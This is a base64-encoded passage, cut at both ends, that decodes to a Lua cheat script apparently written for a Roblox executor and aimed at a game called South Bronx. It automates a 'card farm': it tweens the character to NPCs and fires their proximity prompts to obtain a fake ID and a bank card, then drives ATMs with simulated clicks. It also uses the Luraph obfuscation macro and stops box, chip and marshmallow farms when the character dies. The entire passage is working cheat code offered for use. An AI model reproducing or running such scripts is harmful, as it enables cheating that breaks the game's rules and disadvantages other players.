ICAgICAgICAgICAgICAgICAgICAgICAgIFNlcnZpY2VzLlZpcnR1YWxVc2VyOkNsaWNrQnV0dG9uMShWZWN0b3IyLm5ldyhMb2NhbFBsYXllci5QbGF5ZXJHdWkuQVRNLkZyYW1lLlN3aXBlLkFic29sdXRlUG9zaXRpb24pKSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgbm90IExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiQVRNIikKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwbGF5ZXJIYXNDYXJkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKSBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNhcmQiKSBhbmQgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlzdGFuY2VGcm9tRmFrZUlEU2VsbGVyID0gR2V0RGlzdGFuY2UoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24sIFZlY3RvcjMubmV3KDIxOS40MjU0MzAyOTc4NTE1NiwgMy43MzcxMzI1NDkyODU4ODg3LCAtMzMyLjI2NDA2ODYwMzUxNTYpKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVHdlZW4gPSBTZXJ2aWNlcy5Ud2VlblNlcnZpY2U6Q3JlYXRlKExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LCBUd2VlbkluZm8ubmV3KEdldFR3ZWVuU3BlZWQoRGlzdGFuY2VGcm9tRmFrZUlEU2VsbGVyKSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpLCB7Q0ZyYW1lID0gQ0ZyYW1lLm5ldygyMTkuNDI1NDMwMjk3ODUxNTYsIDMuNzM3MTMyNTQ5Mjg1ODg4NywgLTMzMi4yNjQwNjg2MDM1MTU2KX0pCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5XLCBUd2VlbikgOyBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIFR3ZWVuKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW46UGxheSgpIDsgVHdlZW4uQ29tcGxldGVkOldhaXQoKSA7IFR3ZWVuID0gbmlsCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzLkZha2VJRFNlbGxlci5VcHBlclRvcnNvLkF0dGFjaG1lbnQ6RmluZEZpcnN0Q2hpbGQoIlByb3hpbWl0eVByb21wdCIpKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGlmIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDYXJkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBEaXN0YW5jZUZyb21GYWtlQmFua0NsZXJrID0gR2V0RGlzdGFuY2UoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24sIFZlY3RvcjMubmV3KC00OS4wMzExNTQ2MzI1NjgzNiwgMy43MzcxMzg3NDgxNjg5NDUzLCAtMzIzLjI4NjE5Mzg0NzY1NjI1KSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFR3ZWVuID0gU2VydmljZXMuVHdlZW5TZXJ2aWNlOkNyZWF0ZShMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCwgVHdlZW5JbmZvLm5ldyhHZXRUd2VlblNwZWVkKERpc3RhbmNlRnJvbUZha2VCYW5rQ2xlcmspLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBDRnJhbWUubmV3KC00OS4wMzExNTQ2MzI1NjgzNiwgMy43MzcxMzg3NDgxNjg5NDUzLCAtMzIzLjI4NjE5Mzg0NzY1NjI1KX0pCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5XLCBUd2VlbikgOyBQcmVzc0tleVR3ZWVuKEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIFR3ZWVuKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW46UGxheSgpIDsgVHdlZW4uQ29tcGxldGVkOldhaXQoKSA7IFR3ZWVuID0gbmlsCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00OSwgNCwgLTMyMSkpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMi4xKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQXBwbGljYXRpb25fU3VjY2Vzc2Z1bCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE9sZCA7IE9sZCA9IExvY2FsUGxheWVyLlBsYXllckd1aS5NYWluLk1lc3NhZ2UuV2FybmluZzpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlRleHQiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWFpbi5NZXNzYWdlLldhcm5pbmcuVGV4dDpmaW5kKCJhcHBsaWNhdGlvbiIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLlBsYXllckd1aS5NYWluLk1lc3NhZ2UuV2FybmluZy5UZXh0ID09ICJZb3VyIGFwcGxpY2F0aW9uIHdhcyBzdWNjZXNzZnVsLiBQbGVhc2UgYWxsb3cgMzAgc2Vjb25kcyBmb3IgdGhlIGJhbmsgdG8gcHJlcGFyZSB5b3VyIGNhcmQuIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXBwbGljYXRpb25fU3VjY2Vzc2Z1bCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXJIYXNDYXJkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFwcGxpY2F0aW9uX1N1Y2Nlc3NmdWwgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllckhhc0NhcmQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGlmIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgdW50aWwgV29ya3NwYWNlLk5QQ3M6RmluZEZpcnN0Q2hpbGQoIkJhbmsgVGVsbGVyIikKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzOkZpbmRGaXJzdENoaWxkKCJCYW5rIFRlbGxlciIpLlVwcGVyVG9yc28uQXR0YWNobWVudDpGaW5kRmlyc3RDaGlsZCgiUHJveGltaXR5UHJvbXB0IikpIHRhc2sud2FpdCgpIHVudGlsIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWFpbi5NZXNzYWdlLldhcm5pbmc6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJUZXh0Iik6V2FpdCgpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2xkOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjUpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBBcHBsaWNhdGlvbl9TdWNjZXNzZnVsID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEuNSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oVmVjdG9yMy5uZXcoLTQzLCA0LCAtMzMyKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5CbGFuay5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNhcmQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVySGFzQ2FyZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlzdGFuY2VGcm9tRmFrZUJhbmtDbGVyayA9IEdldERpc3RhbmNlKExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLCBWZWN0b3IzLm5ldygtNDkuMDMxMTU0NjMyNTY4MzYsIDMuNzM3MTM4NzQ4MTY4OTQ1MywgLTMyMy4yODYxOTM4NDc2NTYyNSkpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFR3ZWVuID0gU2VydmljZXMuVHdlZW5TZXJ2aWNlOkNyZWF0ZShMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCwgVHdlZW5JbmZvLm5ldyhHZXRUd2VlblNwZWVkKERpc3RhbmNlRnJvbUZha2VCYW5rQ2xlcmspLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBDRnJhbWUubmV3KC00OS4wMzExNTQ2MzI1NjgzNiwgMy43MzcxMzg3NDgxNjg5NDUzLCAtMzIzLjI4NjE5Mzg0NzY1NjI1KX0pCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXlUd2VlbihFbnVtLktleUNvZGUuVywgVHdlZW4pIDsgUHJlc3NLZXlUd2VlbihFbnVtLktleUNvZGUuTGVmdFNoaWZ0LCBUd2VlbikKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUd2VlbjpQbGF5KCkgOyBUd2Vlbi5Db21wbGV0ZWQ6V2FpdCgpIDsgVHdlZW4gPSBuaWwKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00OSwgNCwgLTMyMSkpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDIuMSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhWZWN0b3IzLm5ldygtNDMsIDQsIC0zMzIpKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS41KQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGZpcmVwcm94aW1pdHlwcm9tcHQoV29ya3NwYWNlLkJsYW5rLkF0dGFjaG1lbnQuUHJveGltaXR5UHJvbXB0KSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllckhhc0NhcmQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDYXJkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMykKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEFUTTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBHZXRDbG9zZXN0QVRNKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBBVE1DbG9zZXN0VGFibGUgPSB7fQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFdvcmtzcGFjZS5NYXAuQVRNUzpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlLkFUTVNjcmVlbi5UcmFuc3BhcmVuY3kgPT0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChBVE1DbG9zZXN0VGFibGUsIHtBVE0gPSBWYWx1ZSwgUmFuZ2UgPSAoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gLSBWYWx1ZS5Qb3NpdGlvbikuTWFnbml0dWRlfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLnNvcnQoQVRNQ2xvc2VzdFRhYmxlLCBmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzZWxlY3QoMSwgLi4uKS5SYW5nZSA8IHNlbGVjdCgyLCAuLi4pLlJhbmdlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gQVRNQ2xvc2VzdFRhYmxlWzFdIH49IG5pbCBhbmQgQVRNQ2xvc2VzdFRhYmxlWzFdLkFUTSBvciBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgdW50aWwgR2V0Q2xvc2VzdEFUTSgpIH49IG5pbAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTSA9IEdldENsb3Nlc3RBVE0oKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlzdGFuY2VGcm9tQVRNID0gR2V0RGlzdGFuY2UoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24sIEFUTVBvc2l0aW9uc1t0b3N0cmluZyhBVE0pXS5Qb3NpdGlvbikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUd2VlbiA9IFNlcnZpY2VzLlR3ZWVuU2VydmljZTpDcmVhdGUoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQsIFR3ZWVuSW5mby5uZXcoR2V0VHdlZW5TcGVlZChEaXN0YW5jZUZyb21BVE0pLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciksIHtDRnJhbWUgPSBBVE1Qb3NpdGlvbnNbdG9zdHJpbmcoQVRNKV19KQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXlUd2VlbihFbnVtLktleUNvZGUuVywgVHdlZW4pIDsgUHJlc3NLZXlUd2VlbihFbnVtLktleUNvZGUuTGVmdFNoaWZ0LCBUd2VlbikKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuOlBsYXkoKSA7IFR3ZWVuLkNvbXBsZXRlZDpXYWl0KCkgOyBUd2VlbiA9IG5pbAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oQVRNLkNGcmFtZS5Qb3NpdGlvbikKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg0KQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChBVE0uQXR0YWNobWVudC5Qcm94aW1pdHlQcm9tcHQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEFUTS5BVE1TY3JlZW4uVHJhbnNwYXJlbmN5ID09IDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDYXJkIikpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSB1bnRpbCBMb2NhbFBsYXllci5QbGF5ZXJHdWk6RmluZEZpcnN0Q2hpbGQoIkFUTSIpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXJ2aWNlcy5WaXJ0dWFsVXNlcjpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuQVRNLkZyYW1lLlN3aXBlLlBvc2l0aW9uID0gVURpbTIubmV3KC0zLjA3NDIwOTIsIDAsIC0wLjI3MDMzODk3NCwgMCkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuQVRNLkZyYW1lLlN3aXBlLlNpemUgPSBVRGltMi5uZXcoMTAwMSArIFJhbmRvbS5uZXcoKTpOZXh0TnVtYmVyKDAuMSwgMSksIDAsIDEwMDEgKyBSYW5kb20ubmV3KCk6TmV4dE51bWJlcigwLjEsIDEpLCAwKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJBVE0iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VydmljZXMuVmlydHVhbFVzZXI6Q2FwdHVyZUNvbnRyb2xsZXIoKSA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VydmljZXMuVmlydHVhbFVzZXI6Q2xpY2tCdXR0b24xKFZlY3RvcjIubmV3KExvY2FsUGxheWVyLlBsYXllckd1aS5BVE0uRnJhbWUuU3dpcGUuQWJzb2x1dGVQb3NpdGlvbikpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBub3QgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJBVE0iKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBTdG9wX0NhcmRGYXJtID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbm90IENhcmRGYXJtX1RocmVhZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGlmIGNvcm91dGluZS5zdGF0dXMoQ2FyZEZhcm1fVGhyZWFkKSA9PSAic3VzcGVuZGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoQ2FyZEZhcm1fVGhyZWFkKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQoKICAgICAgICAgICAgSHVtYW5vaWQuRGllZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRwX2RlYm91bmNlID0gZmFsc2UKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5DYXJkRmFybSB0aGVuCiAgICAgICAgICAgICAgICAgICAgU3RvcF9DYXJkRmFybSgpCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU291dGhfQnJvbnguRmFybWluZ1V0aWxpdGllcy5Cb3hGYXJtIHRoZW4KICAgICAgICAgICAgICAgICAgICBTdG9wX0JveEZhcm0oKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuQ2hpcEZhcm0gdGhlbgogICAgICAgICAgICAgICAgICAgIFN0b3BfQ2hpcEZhcm0oKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNvdXRoX0Jyb254LkZhcm1pbmdVdGlsaXRpZXMuTWFyc2htYWxsb3dGYXJtIHRoZW4KICAgICAgICAgICAgICAgICAgICBTdG9wX01hcnNobWFsbG93RmFybSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihDaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICBIdW1hbm9pZCA9IENoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKI